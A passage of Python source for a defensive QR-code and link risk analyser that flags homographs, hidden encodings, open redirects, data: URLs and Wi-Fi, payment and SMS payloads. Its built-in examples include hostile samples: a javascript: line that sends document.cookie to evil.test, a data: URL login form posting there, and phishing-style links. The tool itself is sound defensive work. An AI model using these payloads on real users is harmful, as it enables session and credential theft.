                                  f"resembles : {hit['target']}",
                                  f"If you expected {hit['target']}, do not use this code - "
                                  f"type the address yourself instead."))
            if reg_for_compare == decoded_reg:
                break

    # ---- percent-encoding used to hide what the path and query actually say ----
    # Encoding is legal and ordinary in a URL, but encoding characters that never
    # needed encoding - dots, slashes, letters - is how a path is made unreadable
    # to a human skimming the link, which is the whole game here.
    for part_name, part in (("path", d.get("path") or ""),
                            ("query", d.get("query") or "")):
        if "%" not in part:
            continue
        try:
            decoded = urllib.parse.unquote(part)
        except Exception:
            continue
        if decoded == part:
            continue
        # how much of the encoding was gratuitous?
        gratuitous = len(re.findall(r"%(?:2[eEfF]|3[aA]|[46][0-9a-fA-F]|[57][0-9a-fA-F])",
                                    part))
        low_dec = decoded.lower()
        if "../" in decoded or "..\\" in decoded:
            findings.append(F("Path", f"The {part_name} hides a directory traversal",
                              "high",
                              "Percent-encoding conceals '../' sequences, which try to "
                              "climb out of the intended directory on the server.",
                              f"{part[:90]}  decodes to  {decoded[:90]}",
                              "This is an attack against the site, not against you - but a "
                              "link built this way was not written by the site's owner. Do "
                              "not open it."))
        elif re.search(r"^\s*[a-z][a-z0-9+.\-]{1,20}://", low_dec) or \
                re.search(r"%3[aA]%2[fF]%2[fF]", part):
            findings.append(F("Path", f"The {part_name} hides another address", "high",
                              "Percent-encoding conceals a second URL inside this one. That "
                              "is how a link is made to look like it goes one place while "
                              "carrying instructions to go somewhere else.",
                              f"{part[:90]}  decodes to  {decoded[:90]}",
                              "Read the decoded form above and judge THAT address, not the "
                              "one you were shown."))
        elif gratuitous >= 4:
            findings.append(F("Path", f"The {part_name} is needlessly percent-encoded",
                              "medium",
                              "Ordinary characters - letters, dots, slashes - have been "
                              "encoded even though they did not need to be. The usual "
                              "reason is to stop a person reading the link at a glance.",
                              f"{part[:90]}  decodes to  {decoded[:90]}",
                              "Judge the decoded form. If it reads differently from what "
                              "you expected, that difference was the point."))

    # ---- shortener ----
    if d["registrable"] in SHORTENERS:
        findings.append(F("Host", f"This is a URL shortener ({d['registrable']})", "medium",
                          "A shortener hides the real destination completely. Nothing in "
                          "this link tells you, or this tool, where it actually leads.",
                          f"host: {host}",
                          "This tool will not expand it, because resolving a short link "
                          "tells the operator you are looking. Many shorteners show the "
                          "destination if you add '+' to the end of the link - check it "
                          "that way, from a browser you are willing to expose."))

    # ---- TLD ----
    if d["tld"] and d["tld"] in CHEAP_TLDS:
        findings.append(F("Host", f"The domain ends in .{d['tld']}", "low",
                          "This top-level domain is cheap or free to register and appears "
                          "often in abuse reports.",
                          f"host: {host}",
                          "This is a weak signal on its own - plenty of legitimate sites use "
                          "these. It matters only alongside the other findings here."))

    # ---- too many labels, or a brand buried in a subdomain ----
    if len(d["labels"]) >= 5:
        findings.append(F("Host", f"The hostname has {len(d['labels'])} parts", "low",
                          "Long chains of subdomains are used to push the real domain off "
                          "the end of a phone's address bar.",
                          f"host: {visible(host)}",
                          f"Only the last two parts decide where you go: "
                          f"{d['registrable']}. Read a hostname from the RIGHT."))
    reg_labels = len((d["registrable"] or "").split("."))
    if d["labels"] and len(d["labels"]) > reg_labels \
            and d["registrable"] not in KNOWN_RELATED:
        sub = ".".join(d["labels"][:-reg_labels]).lower()
        for target in COMMON_TARGETS:
            tbase = target.split(".")[0]
            if tbase in sub and d["registrable"] != target:
                findings.append(F("Deception", f"'{tbase}' appears in the subdomain, but the "
                                  f"domain is {d['registrable']}", "high",
                                  "Anyone can put any brand name in a subdomain of a domain "
                                  "they own. It means nothing about ownership.",
                                  f"host: {visible(host)}\n"
                                  f"the part that decides: {d['registrable']}",
                                  f"You would be going to {d['registrable']}, not to "
                                  f"{target}."))
                break

    # ---- path and query ----
    findings.extend(_check_path_and_query(d, text))

    # ---- port ----
    if d["port"] and d["port"] not in ("80", "443", ""):
        findings.append(F("Host", f"An unusual port is specified ({d['port']})", "low",
                          "Web traffic normally uses 80 or 443. Another port often means a "
                          "service that is not a normal website.",
                          f"port: {d['port']}",
                          "Not suspicious by itself, but unusual for a link handed to the "
                          "public."))
    return findings, d


def _check_host_characters(host: str, d: dict) -> list[dict]:
    out = []
    decoded, err = punycode_decode(host)
    if err:
        out.append(F("Host", "The punycode in the hostname is malformed", "medium", err,
                     visible(host), "A hostname that will not decode cleanly is worth "
                                    "treating with suspicion."))
    display = decoded or host
    if decoded and decoded != host:
        out.append(F("Deception", "The hostname is punycode and decodes to non-ASCII text",
                     "high",
                     "Written as ASCII it looks harmless; what a browser DISPLAYS is "
                     "different, and that displayed form may look like a familiar name.",
                     f"written  : {host}\ndisplays as: {visible(decoded)}",
                     "Compare the decoded form against the name you expected, character by "
                     "character."))
    scripts = {}
    for ch in display:
        if ch in ".-_0123456789":
            continue
        s = script_of(ch)
        scripts.setdefault(s, []).append(ch)
    non_ascii = {s: c for s, c in scripts.items() if s != "ASCII"}
    if len(scripts) > 1 and non_ascii:
        detail = "; ".join(f"{s}: {''.join(sorted(set(c)))}" for s, c in scripts.items())
        out.append(F("Deception", "The hostname mixes writing systems", "critical",
                     "A domain that mixes scripts is the classic homograph attack: a few "
                     "letters are replaced with identical-looking ones from another "
                     "alphabet, and the result is a completely different domain that reads "
                     "exactly like the real one.",
                     f"host displays as: {visible(display)}\nscripts present: {detail}",
                     "This is almost never legitimate for a brand you recognise. Do not use "
                     "this code."))
    elif non_ascii:
        confusable = [ch for ch in display if ch in CONFUSABLES]
        if confusable:
            out.append(F("Deception", "The hostname uses characters that look like ASCII "
                         "letters", "high",
                         "These characters are not the Latin letters they resemble.",
                         f"host: {visible(display)}\n"
                         f"folds to: {skeleton(display)}",
                         "Compare the folded form with the domain you expected."))
        else:
            out.append(F("Host", "The hostname contains non-ASCII characters", "info",
                         "An internationalised domain name. Entirely legitimate in many "
                         "languages.",
                         f"host: {visible(display)}",
                         "Only a concern if the name is meant to be a familiar ASCII brand."))
    invisible = [ch for ch in host + display
                 if unicodedata.category(ch) in ("Cf", "Cc")
                 or ch in "\u200b\u200c\u200d\ufeff\u2060"]
    if invisible:
        out.append(F("Deception", "The hostname contains invisible characters", "critical",
                     "Zero-width or formatting characters are present. They render as "
                     "nothing, so the name shown to you is not the name being used.",
                     f"host: {visible(display)}",
                     "There is no legitimate reason for this. Do not use this code."))
    return out


def _check_path_and_query(d: dict, text: str) -> list[dict]:
    out = []
    path, query = d["path"] or "", d["query"] or ""
    whole = f"{path}?{query}" if query else path
    low = whole.lower()

    words = {w for w in SENSITIVE_WORDS if w in low}
    if words:
        out.append(F("Content", "The link mentions accounts, security or payment", "medium",
                     "Words like these are what a phishing page needs you to believe. They "
                     "prove nothing on their own - a real bank uses them too - but combined "
                     "with any host finding above they matter a great deal.",
                     f"found: {', '.join(sorted(words))}",
                     "If this code claims to be about your account, do not use it. Open the "
                     "organisation's app or type its address yourself."))

    # A URL hidden inside another URL's parameters
    for m in re.finditer(r"(?:https?%3a%2f%2f|https?://)", whole, re.I):
        inner = whole[m.start():]
        decoded_inner = urllib.parse.unquote(inner)
        inner_host = dissect_url(decoded_inner)["host"]
        if inner_host and inner_host != d["host"]:
            out.append(F("Deception", "Another URL is embedded in this one", "high",
                         "The link carries a second address inside it. Open redirects work "
                         "exactly this way: a trusted site is asked to forward you somewhere "
                         "else entirely.",
                         f"outer host: {d['host']}\ninner  : {visible(decoded_inner[:120])}",
                         f"You may end up at {inner_host}, not {d['host']}."))
            break

    if "%" in whole:
        try:
            once = urllib.parse.unquote(whole)
            twice = urllib.parse.unquote(once)
            if twice != once:
                out.append(F("Deception", "The link is percent-encoded more than once",
                             "high",
                             "Double encoding is used to slip past filters that decode only "
                             "once, and to make a link unreadable.",
                             f"decodes to: {visible(twice[:140])}",
                             "There is very rarely a legitimate reason for this."))
        except Exception:
            pass

    b64 = re.findall(r"[A-Za-z0-9+/]{24,}={0,2}", whole)
    for chunk in b64[:2]:
        try:
            raw = base64.b64decode(chunk + "=" * (-len(chunk) % 4), validate=True)
            decoded = raw.decode("utf-8")
            if sum(c.isprintable() for c in decoded) / max(len(decoded), 1) > 0.9 and \
                    ("http" in decoded.lower() or "@" in decoded):
                out.append(F("Deception", "A base64 value in the link decodes to readable "
                             "text", "medium",
                             "Something in this link is encoded rather than written plainly.",
                             f"decodes to: {visible(decoded[:120])}",
                             "Read the decoded value and judge the link on that."))
                break
        except (binascii.Error, UnicodeDecodeError, ValueError):
            continue

    if len(text) > 300:
        out.append(F("Content", f"The link is very long ({len(text)} characters)", "low",
                     "Long links are hard to read and easy to hide things in.",
                     f"{len(path)} characters of path, {len(query)} of query",
                     "Length alone means little; it matters because it stops you checking "
                     "the link by eye."))

    if re.search(r"\.(exe|apk|msi|scr|bat|cmd|jar|dmg|pkg|vbs|ps1|zip|rar|7z)(?:$|[?#])",
                 low):
        ext = re.search(r"\.(\w+)(?:$|[?#])", low)
        out.append(F("Content", f"The link points at a downloadable file "
                     f"(.{ext.group(1) if ext else '?'})", "high",
                     "This is not a web page; it is a file, and several of these types run "
                     "code when opened.",
                     f"path: {visible(path[:120])}",
                     "Never install an application from a QR code. Use the official app "
                     "store."))
    return out


def _check_data_url(text: str) -> list[dict]:
    out = []
    m = re.match(r"^data:([^,]*),(.*)$", text, re.S)
    if not m:
        return out
    meta, body = m.group(1), m.group(2)
    is_b64 = "base64" in meta.lower()
    mime = meta.split(";")[0] or "text/plain"
    decoded = ""
    if is_b64:
        try:
            decoded = base64.b64decode(body + "=" * (-len(body) % 4)).decode(
                "utf-8", "replace")
        except (binascii.Error, ValueError):
            decoded = ""
    else:
        decoded = urllib.parse.unquote(body)
    out.append(F("Scheme", f"The data: URL carries {mime} content directly", "high",
                 "The whole page is inside the code itself. There is no domain, no "
                 "certificate and no server - so there is nothing to check and nothing to "
                 "report.",
                 f"{len(text)} characters, {'base64' if is_b64 else 'plain'}",
                 "A page delivered this way cannot be verified by anyone."))
    if decoded:
        low = decoded.lower()
        if "<form" in low or "type=\"password\"" in low or "type='password'" in low:
            out.append(F("Scheme", "The embedded content contains a login form", "critical",
                         "A page carried inside a QR code is asking for credentials. There "
                         "is no legitimate version of this.",
                         visible(decoded[:200]),
                         "Do not open it. This is a phishing page with no server behind it."))
        if "<script" in low or "javascript:" in low:
            out.append(F("Scheme", "The embedded content contains script", "critical",
                         "Executable code is being delivered inside the QR code.",
                         visible(decoded[:200]),
                         "Do not open it."))
    return out


# =============================================================================
# SECTION 6 - Non-URL payloads
#   A QR code that joins a Wi-Fi network or starts a payment is more dangerous
#   than most links, and scanners act on these with a single tap.
# =============================================================================

def analyse_wifi(fields: dict) -> list[dict]:
    out = []
    ssid = fields.get("S", "")
    auth = (fields.get("T", "") or "nopass").upper()
    password = fields.get("P", "")
    hidden = (fields.get("H", "") or "").lower() in ("true", "1")
    out.append(F("Wi-Fi", f"This code joins the network '{visible(ssid)}'", "high",
                 "Scanning this offers to connect the device to a wireless network. One "
                 "tap and every unencrypted thing the device sends passes through whoever "
                 "runs it.",
                 f"SSID: {visible(ssid)}\nsecurity: {auth or 'none'}\n"
                 f"password: {'yes, ' + str(len(password)) + ' characters' if password else 'none'}"
                 + ("\nhidden network: yes" if hidden else ""),
                 "Only join a network you were expecting to join, from a code you trust the "
                 "source of. A printed code on a wall is trivially replaced with a sticker."))
    if auth in ("NOPASS", "") or not password:
        out.append(F("Wi-Fi", "The network is open, with no password", "high",
                     "An open network encrypts nothing at the link layer. Anyone within "
                     "range can read traffic that is not itself encrypted.",
                     f"security: {auth or 'none'}",
                     "Treat everything you do on it as public. Avoid logging in to anything."))
    elif auth == "WEP":
        out.append(F("Wi-Fi", "The network uses WEP", "high",
                     "WEP has been breakable in minutes for two decades.",
                     f"security: {auth}",
                     "A network still using WEP is either very old or not what it claims."))
    if hidden:
        out.append(F("Wi-Fi", "The network is marked hidden", "low",
                     "A device configured for a hidden network broadcasts its name looking "
                     "for it, everywhere it goes afterwards.",
                     "H:true",
                     "Hidden networks are not more secure, and they make the device noisier."))
    if ssid and any(w in ssid.lower() for w in
                    ("free", "guest", "public", "wifi", "airport", "hotel", "cafe")):
        out.append(F("Wi-Fi", "The network name is a generic one", "low",
                     "Names like this are what an attacker chooses precisely because nobody "
                     "questions them.",
                     f"SSID: {visible(ssid)}",
                     "Confirm the exact name with staff rather than trusting the code."))
    return out


def analyse_payment(payload: str, kind_fields: dict, scheme: str | None) -> list[dict]:
    out = []
    out.append(F("Payment", "This code starts a payment", "high",
                 "Scanning this opens a payment app with a recipient - and sometimes an "
                 "amount - already filled in. This moves money, not data.",
                 visible(payload[:180]),
                 "Read the recipient name and the amount on your own screen before "
                 "confirming. Never let anyone rush you through this step."))
    payee = kind_fields.get("pn") or kind_fields.get("pa")
    amount = kind_fields.get("am")
    if amount:
        out.append(F("Payment", f"The amount is already filled in ({amount})", "medium",
                     "A pre-set amount means one less thing you will check.",
                     f"amount: {amount}",
                     "Confirm the amount is what you expect before approving."))
    if payee:
        out.append(F("Payment", f"The recipient is '{visible(str(payee))}'", "info",
                     "A payee name in a code is chosen by whoever made the code, and is not "
                     "verified by anyone.",
                     f"recipient: {visible(str(payee))}",
                     "Check the name your payment app shows - that one comes from the bank, "
                     "not from the code."))
    if scheme in ("bitcoin", "ethereum", "litecoin", "bitcoincash"):
        out.append(F("Payment", f"This is a {scheme} address", "high",
                     "Cryptocurrency payments cannot be reversed and cannot be recalled.",
                     visible(payload[:120]),
                     "There is no chargeback. If this is not a payment you initiated "
                     "yourself, do not send anything."))
    return out


def analyse_tel_sms(payload: str, kind: str) -> list[dict]:
    out = []
    body = payload.split(":", 1)[1] if ":" in payload else payload
    number = body.split(":")[0].split("?")[0].strip()
    if kind == "tel":
        out.append(F("Phone", f"This code dials {visible(number)}", "medium",
                     "Scanning this offers to place a call. Premium-rate numbers charge "
                     "from the moment the call connects.",
                     f"number: {visible(number)}",
                     "Check the number, especially the country code and any short code."))
    else:
        text = ""
        if ":" in body:
            text = body.split(":", 1)[1]
        elif "?" in body:
            text = urllib.parse.parse_qs(body.split("?", 1)[1]).get("body", [""])[0]
        out.append(F("SMS", f"This code sends a text to {visible(number)}", "medium",
                     "Scanning this pre-fills a message" +
                     (" with the body already written" if text else "") +
                     ". Premium shortcodes charge on send, and a pre-written body can "
                     "subscribe you to something.",
                     f"number: {visible(number)}"
                     + (f"\nmessage: {visible(text[:120])}" if text else ""),
                     "Read the message body before sending. A short number with a "
                     "pre-written word is how subscription scams work."))
    if re.fullmatch(r"\+?\d{3,6}", number):
        out.append(F("Phone", "This is a short code, not a normal number", "high",
                     "Short numbers are used for billing services and are frequently "
                     "premium rate.",
                     f"number: {number}",
                     "Do not send to a short code you were not expecting."))
    return out


def analyse_other(kind: str, payload: str, cls: dict) -> list[dict]:
    out = []
    if kind == "otp":
        out.append(F("Authenticator", "This code adds a two-factor secret", "medium",
                     "It configures an authenticator app with a shared secret.",
                     visible(payload[:120]),
                     "Only scan this on the setup page of an account you are actively "
                     "securing. A code presented anywhere else is trying to attach YOUR "
                     "authenticator to THEIR account, or to capture yours."))
    elif kind == "intent":
        out.append(F("App", "This is an Android intent", "high",
                     "It asks Android to open a specific application and can hand data "
                     "straight to it, bypassing the browser entirely.",
                     visible(payload[:160]),
                     "Intent links are hard to read and are used to reach app functions "
                     "that were never meant to be triggered by a stranger."))
    elif kind == "app":
        out.append(F("App", f"This opens an application directly ({cls.get('scheme')}:)",
                     "medium",
                     "The payload uses a custom scheme, so it opens an app rather than a "
                     "web page. What the app does with it is not visible here.",
                     visible(payload[:160]),
                     "Only useful if you recognise the app and expected the code."))
    elif kind == "vcard":
        out.append(F("Contact", "This code adds a contact", "low",
                     "It offers to save a name and number to the phonebook.",
                     visible(payload[:160]),
                     "Harmless in itself. It is also a way to plant a convincing fake number "
                     "so that a later call appears to come from someone you trust."))
    elif kind == "calendar":
        out.append(F("Calendar", "This code adds a calendar event", "low",
                     "Events can carry a description with a link, and a reminder that "
                     "surfaces it later.",
                     visible(payload[:160]),
                     "Check any link in the event before following it."))
    elif kind == "geo":
        out.append(F("Location", "This code opens a map location", "info",
                     "It opens coordinates in a maps application.",
                     visible(payload[:120]), "No action is taken beyond showing a map."))
    elif kind == "mailto":
        out.append(F("Email", "This code composes an email", "low",
                     "It opens a pre-filled message.",
                     visible(payload[:160]),
                     "Check the recipient and any attachment prompt."))
    elif kind == "text":
        out.append(F("Text", "This code contains plain text", "info",
                     "No action is taken by scanning it.",
                     visible(payload[:200]),
                     "Read it, but nothing here will open or run."))
    return out


# =============================================================================
# SECTION 7 - Putting one payload through everything
# =============================================================================

def analyse_payload(payload: str, origin: str = "text") -> dict:
    cls = classify_payload(payload)
    kind = cls["kind"]
    findings: list[dict] = []
    dissected = None

    if kind == "url":
        findings, dissected = analyse_url(payload)
    elif kind == "wifi":
        findings = analyse_wifi(cls["fields"])
    elif kind == "payment":
        findings = analyse_payment(payload, cls["fields"], cls["scheme"])
    elif kind in ("tel", "sms"):
        findings = analyse_tel_sms(payload, kind)
    else:
        findings = analyse_other(kind, payload, cls)

    # Checks that apply to any payload at all.
    invisible = [ch for ch in payload
                 if unicodedata.category(ch) in ("Cf", "Cc") and ch not in "\r\n\t"]
    if invisible and kind != "url":
        findings.append(F("Deception", "The payload contains invisible characters", "high",
                          "Zero-width or control characters are present, so what is shown "
                          "is not what is there.",
                          visible(payload[:160]),
                          "Treat the payload as deliberately obscured."))
    if re.search(r"[\u202a-\u202e\u2066-\u2069]", payload):
        findings.append(F("Deception", "The payload contains text-direction overrides",
                          "critical",
                          "These characters reverse how text is displayed, so the payload "
                          "can be made to read as something completely different from what "
                          "it is.",
                          visible(payload[:160]),
                          "There is no legitimate use of this in a QR code. Do not act on "
                          "it."))

    counts = {s: sum(1 for f in findings if f["severity"] == s) for s in SEVERITIES}
    score = round(clamp(sum(SEV_WEIGHT[f["severity"]] for f in findings), 0, 100), 1)
    band, colour = risk_band(score)
    kind_label, kind_note = PAYLOAD_KINDS.get(kind, PAYLOAD_KINDS["unknown"])
    return {
        "payload": payload, "origin": origin, "kind": kind, "kind_label": kind_label,
        "kind_note": kind_note, "scheme": cls.get("scheme"), "fields": cls.get("fields", {}),
        "dissected": dissected, "findings": findings, "counts": counts, "score": score,
        "band": band, "colour": colour, "visible": visible(payload, 400),
        "length": len(payload),
        "destination": (dissected or {}).get("host") if dissected else None,
        "never_fetched": True,
    }


def analyse_many(payloads: list[str], origin: str = "text") -> dict:
    results = [analyse_payload(p, origin) for p in payloads]
    worst = max((r["score"] for r in results), default=0.0)
    return {"results": results, "worst_score": worst, "worst_band": risk_band(worst)[0],
            "count": len(results), "origin": origin}


EXAMPLES = [
    ("A perfectly ordinary link", "https://example.com/menu"),
    ("Credentials before the host - goes to evil.test",
     "https://apple.com@evil.test/login"),
    ("Homograph: Cyrillic characters that read as apple.com",
     "https://xn--pple-43d.com/verify-account"),
    ("The host is an address written in decimal", "http://2130706433/admin"),
    ("A brand name buried in a subdomain",
     "https://secure-paypal.com.verify-account.tk/login"),
    ("A URL shortener, which hides everything", "https://bit.ly/3xAmPle"),
    ("An open Wi-Fi network with no password",
     "WIFI:S:Free_Airport_WiFi;T:nopass;P:;H:false;;"),
    ("A payment with the amount pre-filled",
     "upi://pay?pa=merchant@bank&pn=Coffee%20Shop&am=499.00&cu=INR"),
    ("A premium-rate short code with a pre-written message",
     "SMSTO:57575:SUBSCRIBE PREMIUM"),
    ("javascript:, which has no legitimate use in a QR code",
     "javascript:fetch('//evil.test/'+document.cookie)"),
    ("A login form delivered inside the code itself",
     "data:text/html;base64," + base64.b64encode(
         b"<html><form action='//evil.test'><input type='password'></form></html>"
     ).decode()),
    ("An open redirect carrying a second URL",
     "https://trusted.example/r?url=https%3A%2F%2Fevil.test%2Fsteal"),
]


# =============================================================================
# SECTION 8 - Database
# =============================================================================

SCHEMA = """
CREATE TABLE IF NOT EXISTS scans (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT NOT NULL, origin TEXT, source TEXT, decoder_status TEXT, decoder_detail TEXT,
    payload_count INTEGER DEFAULT 0, worst_score REAL DEFAULT 0, worst_band TEXT,
    findings INTEGER DEFAULT 0, critical INTEGER DEFAULT 0, high INTEGER DEFAULT 0,
    medium INTEGER DEFAULT 0, low INTEGER DEFAULT 0, info INTEGER DEFAULT 0, note TEXT
);
CREATE TABLE IF NOT EXISTS payloads (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER NOT NULL, ordinal INTEGER,
    payload TEXT, kind TEXT, scheme TEXT, destination TEXT, score REAL, band TEXT,
    length INTEGER, result TEXT,
    FOREIGN KEY (scan_id) REFERENCES scans(id)
);
CREATE TABLE IF NOT EXISTS findings (
    id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id INTEGER NOT NULL, payload_id INTEGER,
    category TEXT, title TEXT, severity TEXT, description TEXT, evidence TEXT, advice TEXT,
    FOREIGN KEY (scan_id) REFERENCES scans(id)
);
CREATE TABLE IF NOT EXISTS audit_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ts TEXT NOT NULL, level TEXT NOT NULL, source TEXT, message TEXT, scan_id INTEGER
);
CREATE INDEX IF NOT EXISTS idx_pay_scan ON payloads(scan_id);
CREATE INDEX IF NOT EXISTS idx_find_scan ON findings(scan_id);
CREATE INDEX IF NOT EXISTS idx_scans_score ON scans(worst_score);
CREATE INDEX IF NOT EXISTS idx_audit_ts ON audit_log(ts);
"""

_DB_PATH = DEFAULT_DB


def set_db_path(p: str) -> None:
    global _DB_PATH
    _DB_PATH = p


def db_path() -> str:
    return _DB_PATH


def connect(path: str | None = None) -> sqlite3.Connection:
    conn = sqlite3.connect(path or _DB_PATH, timeout=30.0)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db(conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        conn.executescript(SCHEMA)
        conn.commit()
    finally:
        if own:
            conn.close()


def q(sql: str, args: tuple = (), conn=None) -> list[sqlite3.Row]:
    own = conn is None
    conn = conn or connect()
    try:
        return conn.execute(sql, args).fetchall()
    finally:
        if own:
            conn.close()


def q1(sql: str, args: tuple = (), conn=None):
    rows = q(sql, args, conn)
    return rows[0] if rows else None


def log_event(level: str, source: str, message: str, scan_id=None, conn=None) -> None:
    own = conn is None
    conn = conn or connect()
    try:
        conn.execute("INSERT INTO audit_log (ts, level, source, message, scan_id) "
                     "VALUES (?,?,?,?,?)",
                     (now_iso(), level.upper(), source,
                      " ".join(str(message).split())[:1000], scan_id))
        conn.commit()
    except Exception:
        pass
    finally:
        if own:
            conn.close()


def save_scan(batch: dict, decoder: DecodeResult | None = None, note: str = "") -> int:
    conn = connect()
    try:
        init_db(conn)
        counts = {s: 0 for s in SEVERITIES}
        total = 0
        for r in batch["results"]:
            for s in SEVERITIES:
                counts[s] += r["counts"][s]
            total += len(r["findings"])
        cur = conn.execute(
            "INSERT INTO scans (ts, origin, source, decoder_status, decoder_detail,"
            " payload_count, worst_score, worst_band, findings, critical, high, medium,"
            " low, info, note) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
            (now_iso(), batch["origin"], decoder.source if decoder else "",
             decoder.status if decoder else "n/a", decoder.detail if decoder else "",
             batch["count"], batch["worst_score"], batch["worst_band"], total,
             counts["critical"], counts["high"], counts["medium"], counts["low"],
             counts["info"], note))
        sid = cur.lastrowid
        for i, r in enumerate(batch["results"]):
            pcur = conn.execute(
                "INSERT INTO payloads (scan_id, ordinal, payload, kind, scheme,"
                " destination, score, band, length, result)"
                " VALUES (?,?,?,?,?,?,?,?,?,?)",
                (sid, i, r["payload"], r["kind"], r["scheme"], r["destination"],
                 r["score"], r["band"], r["length"],
                 json.dumps({k: v for k, v in r.items() if k != "findings"},
                            default=str)))
            pid = pcur.lastrowid
            for f in r["findings"]:
                conn.execute("INSERT INTO findings (scan_id, payload_id, category, title,"
                             " severity, description, evidence, advice)"
                             " VALUES (?,?,?,?,?,?,?,?)",
                             (sid, pid, f["category"], f["title"], f["severity"],
                              f["description"], f["evidence"], f["advice"]))
        conn.commit()
        log_event("INFO", "scan", f"Scan #{sid}: {batch['count']} payload(s), worst score "
                  f"{batch['worst_score']} ({batch['worst_band']})", sid, conn)
        return sid
    finally:
        conn.close()


def latest_scan_id(conn=None):
    row = q1("SELECT id FROM scans ORDER BY id DESC LIMIT 1", (), conn)
    return row["id"] if row else None


def scan_summary(sid: int, conn=None):
    row = q1("SELECT * FROM scans WHERE id=?", (sid,), conn)
    return dict(row) if row else None


def scan_payloads(sid: int, conn=None) -> list[dict]:
    out = []
    for r in q("SELECT * FROM payloads WHERE scan_id=? ORDER BY ordinal", (sid,), conn):
        d = dict(r)
        try:
            d["result"] = json.loads(d["result"] or "{}")
        except json.JSONDecodeError:
            d["result"] = {}
        d["findings"] = [dict(f) for f in q(
            "SELECT * FROM findings WHERE payload_id=? ORDER BY CASE severity "
            "WHEN 'critical' THEN 0 WHEN 'high' THEN 1 WHEN 'medium' THEN 2 "
            "WHEN 'low' THEN 3 ELSE 4 END, id", (d["id"],), conn)]
        out.append(d)
    return out


# =============================================================================
# SECTION 9 - Charts (hand-drawn SVG: no CDN, no JS library, works offline)
# =============================================================================

def svg_gauge(score, band, size=160):
    colour = risk_band(score)[1]
    r = size / 2 - 14
    cx = cy = size / 2
    circ = 2 * math.pi * r
    return (f'<svg viewBox="0 0 {size} {size}" width="{size}" height="{size}" role="img" '
            f'aria-label="Risk score {score} of 100, {band}">'
            f'<circle cx="{cx}" cy="{cy}" r="{r:.1f}" fill="none" stroke="#262a33" '
            f'stroke-width="13"/>'
            f'<circle cx="{cx}" cy="{cy}" r="{r:.1f}" fill="none" stroke="{colour}" '
            f'stroke-width="13" stroke-linecap="round" '
            f'stroke-dasharray="{circ * clamp(score, 0, 100) / 100:.2f} {circ:.2f}" '
            f'transform="rotate(-90 {cx} {cy})"/>'
            f'<text x="{cx}" y="{cy + 4}" text-anchor="middle" class="g-n" fill="{colour}">'
            f'{score:g}</text>'
            f'<text x="{cx}" y="{cy + 22}" text-anchor="middle" class="g-l">/100</text>'
            f'</svg>')


def svg_url_anatomy(d: dict, width=940, title="What this URL actually says") -> str:
    """Colour every part of a URL so the host cannot hide.

    The whole homograph and credentials family of attacks works because the eye
    stops reading at a familiar word. This draws the parts in order and marks the
    only one that decides the destination.
    """
    if not d:
        return f'<div class="chart-empty">{html_escape(title)}: not a URL</div>'
    parts = []
    if d.get("scheme"):
        parts.append(("scheme", f"{d['scheme']}://", "#8b8f9b", "how to connect"))
    if d.get("userinfo") is not None:
        parts.append(("credentials - NOT the destination", f"{d['userinfo']}@", "#e5484d",
                      "everything before the @ is ignored as a destination"))
    parts.append(("host - THIS decides where you go", d.get("host") or "(none)", "#f76808",
                  "the only part that matters"))
    if d.get("port"):
        parts.append(("port", f":{d['port']}", "#8b8f9b", ""))
    if d.get("path"):
        parts.append(("path", d["path"][:60], "#22b8cf", "chosen by whoever owns the host"))
    if d.get("query"):
        parts.append(("query", f"?{d['query'][:60]}", "#9775fa", "also chosen by them"))
    if d.get("fragment"):
        parts.append(("fragment", f"#{d['fragment'][:40]}", "#4c6ef5", "never sent to the "
                                                                      "server"))
    row_h = 54
    height = len(parts) * row_h + 58
    out = []
    x = 14
    for i, (label, text, colour, note) in enumerate(parts):
        y = 14 + i * row_h
        out.append(f'<rect x="14" y="{y}" width="{width - 28}" height="{row_h - 8}" rx="7" '
                   f'fill="{colour}18" stroke="{colour}" stroke-width="1.5"/>')
        out.append(f'<text x="26" y="{y + 19}" class="anlabel" fill="{colour}">'
                   f'{html_escape(label)}</text>')
        out.append(f'<text x="26" y="{y + 37}" class="anval">'
                   f'{html_escape(visible(str(text), 88))}</text>')
        if note:
            out.append(f'<text x="{width - 26}" y="{y + 19}" text-anchor="end" '
                       f'class="annote">{html_escape(note)}</text>')
    reg = d.get("registrable")
    if reg:
        out.append(f'<text x="14" y="{height - 20}" class="anfoot">'
                   f'Read a hostname from the RIGHT. The part that decides is: '
                   f'{html_escape(reg)}</text>')
    return (f'<figure class="chart wide"><figcaption>{html_escape(title)}</figcaption>'
            f'<svg viewBox="0 0 {width} {height}" width="100%" height="{height}" '
            f'role="img" aria-label="{html_escape(title)}">{"".join(out)}</svg></figure>')


def svg_charcompare(display: str, width=940, title="Character by character") -> str:
    """Show a hostname one character at a time, naming the non-ASCII ones.

    Against a homograph domain this is the only presentation that actually works:
    the characters are visually identical, so the difference has to be named.
    """
    if not display:
        return f'<div class="chart-empty">{html_escape(title)}: nothing to compare</div>'
    chars = list(display[:60])
    cw = min(30, (width - 40) / max(len(chars), 1))
    height = 130
    out = []
    for i, ch in enumerate(chars):
        x = 20 + i * cw
        ascii_ok = ch.isascii()
        colour = "#30a46c" if ascii_ok else "#e5484d"
        out.append(f'<rect x="{x:.1f}" y="26" width="{cw - 3:.1f}" height="34" rx="4" '
                   f'fill="{colour}22" stroke="{colour}"/>')
        out.append(f'<text x="{x + (cw - 3) / 2:.1f}" y="49" text-anchor="middle" '
                   f'class="cc">{html_escape(ch)}</text>')
        if not ascii_ok:
            try:
                name = unicodedata.name(ch)
            except ValueError:
                name = f"U+{ord(ch):04X}"
            folded = CONFUSABLES.get(ch, "?")
            out.append(f'<text x="{x + (cw - 3) / 2:.1f}" y="74" text-anchor="middle" '
                       f'class="ccbad">not "{html_escape(folded)}"</text>')
            out.append(f'<text x="{x + (cw - 3) / 2:.1f}" y="90" text-anchor="middle" '
                       f'class="cccode">U+{ord(ch):04X}</text>')
            out.append(f'<title>{html_escape(name)}</title>')
    bad = [c for c in chars if not c.isascii()]
    msg = (f"{len(bad)} character(s) are not the Latin letters they look like"
